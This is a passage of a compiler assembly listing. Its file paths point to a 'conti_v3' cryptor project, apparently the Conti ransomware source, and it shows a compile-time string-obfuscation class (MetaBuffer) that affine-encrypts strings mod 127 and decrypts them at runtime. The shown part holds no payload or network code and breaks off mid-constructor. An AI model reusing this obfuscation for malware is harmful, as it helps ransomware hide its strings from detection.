  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv294 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
